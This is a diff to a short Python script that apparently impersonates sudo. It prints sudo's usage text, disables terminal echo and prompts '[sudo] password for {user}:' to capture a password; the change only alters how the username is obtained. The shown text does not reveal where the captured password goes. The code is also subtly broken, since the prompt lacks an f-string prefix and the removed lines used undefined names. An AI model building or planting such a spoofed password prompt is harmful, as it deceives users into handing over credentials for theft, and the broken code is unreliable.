@@ -1,6 +1,7 @@
 import os
 import subprocess
 import sys
+import getpass
 
 def main():
     if(len(sys.argv) == 1):
@@ -12,8 +13,7 @@ def main():
         usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file ...
         """)
     else:
-        subprocess.Popen('whoami', shell=True, stdout=PIPE).stdout
-        user = stdout.read()
+        user = getpass.getuser()
         
         os.system('stty -echo')
         password = input("[sudo] password for {user}: ")
